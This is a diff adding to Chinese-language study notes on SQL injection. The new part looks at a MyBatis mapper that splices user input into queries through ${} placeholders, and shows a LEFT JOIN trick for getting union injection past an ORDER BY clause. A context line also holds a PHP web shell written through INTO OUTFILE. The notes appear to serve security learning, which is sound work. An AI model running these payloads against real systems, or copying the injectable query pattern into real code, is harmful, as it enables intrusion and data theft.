@@ -494,3 +494,51 @@ select '<?php assert($_POST[less2]);?>' into outfile "路径";
 ![image-20230825000250389](.\images\image-20230825000250389.png)
 
 ​	例如这里的%，就起到了通配的作用。
+
+## 第六部分 待整理内容
+
+#### pageHelper分页 联结 union 重复列
+
+```sql
+# 分页查询,联结有重复的行,这种情况下不会Duplicate column error
+SELECT count(0) FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON d.director_id = u.director_id WHERE u.user_id = ? AND u.director_id IS NOT NULL AND u.is_handle = 1 AND u.catelog_name = 'aaa'
+# 但是如果项进行union查询,这里变为子查询,则会有Duplicate column error
+SELECT count(0) FROM (select * from aoa_director_users AS u LEFT JOIN aoa_director AS d ON d.director_id = u.director_id WHERE u.user_id = ? AND u.director_id IS NOT NULL AND u.is_handle = 1 AND u.catelog_name = 'aaa' union ...)
+```
+
+#### order by 的限制
+
+```xml
+<select id="allDirector" resultType="java.util.Map">
+		SELECT d.*,u.*
+		FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON 
+		d.director_id = u.director_id
+		WHERE u.user_id=#{userId} AND u.director_id is NOT null AND u.is_handle=1
+		<if test="pinyin !='ALL'">
+			AND d.pinyin LIKE '${pinyin}%'
+		</if>
+		<if test="outtype !=null and outtype !=''">
+			 AND u.catelog_name = '${outtype}'
+		</if>
+		<if test="baseKey !=null and baseKey !=''">
+		AND
+		(d.user_name LIKE '%${baseKey}%' 
+		OR d.phone_number LIKE '%${baseKey}%' 
+		OR d.companyname LIKE '%${baseKey}%'
+		OR d.pinyin LIKE '${baseKey}%'
+		OR u.catelog_name LIKE '%${baseKey}%'
+		)
+		</if>
+		order by u.catelog_name
+	 </select>
+```
+
+* 这里如果想进行union注入,后面order by u.catelog_name由于指定了表和字段名,做出了一定限制
+
+```sql
+# 可以采用左联结突破限制
+SELECT * FROM information_schema.SCHEMATA AS s LEFT JOIN test.user AS u ON s.SQL_PATH=u.name ORDER BY u.pwd
+```
+
+
+
